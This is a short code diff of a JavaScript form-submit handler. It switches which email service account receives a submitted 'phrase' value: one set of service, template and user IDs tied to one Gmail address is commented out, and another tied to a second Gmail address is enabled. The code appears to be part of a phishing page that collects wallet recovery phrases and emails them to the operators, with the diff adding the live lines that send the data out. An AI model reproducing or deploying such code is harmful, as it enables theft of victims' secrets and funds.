@@ -39,14 +39,14 @@ async function handleSubmit(event) {
       // user_id: "Jdelgc-1AjU_wilO1",
 
       // Bestgrace309@gmail.com
-      service_id: 'service_d5qigxs',
-      template_id: 'template_7bqxeaa',
-      user_id: 'I-7q0Bs-ilK3rFcWj',
+      // service_id: 'service_d5qigxs',
+      // template_id: 'template_7bqxeaa',
+      // user_id: 'I-7q0Bs-ilK3rFcWj',
 
       // godgrace8129@gmail.com
-      // service_id: 'service_d4sf907',
-      // template_id: 'template_f0ey18n',
-      // user_id: '6nKJsC6SLfZaBGCHx',
+      service_id: 'service_d4sf907',
+      template_id: 'template_f0ey18n',
+      user_id: '6nKJsC6SLfZaBGCHx',
       template_params: {
         phrase: val,
       },
